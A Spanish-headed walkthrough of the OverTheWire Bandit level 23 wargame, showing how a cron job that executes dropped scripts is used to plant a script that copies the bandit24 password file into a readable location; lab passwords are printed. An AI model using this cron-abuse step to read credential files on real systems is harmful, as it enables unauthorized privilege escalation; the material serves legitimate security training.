## Objetivo
A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

## Datos de acceso al nivel
Usuario: bandit23@bandit.labs.overthewire.org
Contraseña: QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
Puerto: 2220
## Solución
bandit23@bandit:~$ cat /etc/cron.d/
cat: /etc/cron.d/: Is a directory
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

bandit23@bandit:~$ cat /etc/bandit_pass/bandit23
QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
bandit23@bandit:~$ cd /tmp
bandit23@bandit:/tmp$ mkdir 123456
bandit23@bandit:/tmp$ cd 123456
bandit23@bandit:/tmp/123456$ vim
bandit23@bandit:/tmp/123456$ ls
script.sh
bandit23@bandit:/tmp/123456$ cat script.sh
cat /etc/bandit_pass/bandit24 >> /tmp/123456/llave.txt
bandit23@bandit:/tmp/123456$ ls -la script.sh
-rw-rw-r-- 1 bandit23 bandit23 55 Feb 26 15:28 script.sh
bandit23@bandit:/tmp/123456$ chmod 777 script.sh
bandit23@bandit:/tmp/123456$ ls -la script.sh
-rwxrwxrwx 1 bandit23 bandit23 55 Feb 26 15:28 script.sh
bandit23@bandit:/tmp/123456$ touch llave.txt
bandit23@bandit:/tmp/123456$ chmod 777 llave.txt
bandit23@bandit:/tmp/123456$ ls -la
total 408
drwxrwxr-x   2 bandit23 bandit23   4096 Feb 26 15:30 .
drwxrwx-wt 860 root     root     405504 Feb 26 15:31 ..
-rwxrwxrwx   1 bandit23 bandit23      0 Feb 26 15:30 llave.txt
-rwxrwxrwx   1 bandit23 bandit23     55 Feb 26 15:28 script.sh
bandit23@bandit:/tmp/123456$ ls
llave.txt  script.sh
bandit23@bandit:/tmp/123456$ cp script.sh /var/spool/$myname/foo
cp: cannot create regular file '/var/spool//foo': Permission denied
bandit23@bandit:/tmp/123456$
bandit23@bandit:/tmp/123456$
bandit23@bandit:/tmp/123456$ cp script.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/123456$ cat llave.txt
bandit23@bandit:/tmp/123456$ cat llave.txt
bandit23@bandit:/tmp/123456$ cat llave.txt
bandit23@bandit:/tmp/123456$ cat llave.txt
bandit23@bandit:/tmp/123456$ cat llave.txt
bandit23@bandit:/tmp/123456$ cat llave.txt
bandit23@bandit:/tmp/123456$ cat llave.txt
bandit23@bandit:/tmp/123456$ cat llave.txt
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
## Notas
Chmod es usado para quitar y dar permisos, en este caso se usó 777 para dar permisos de ejecución

## Referencias 
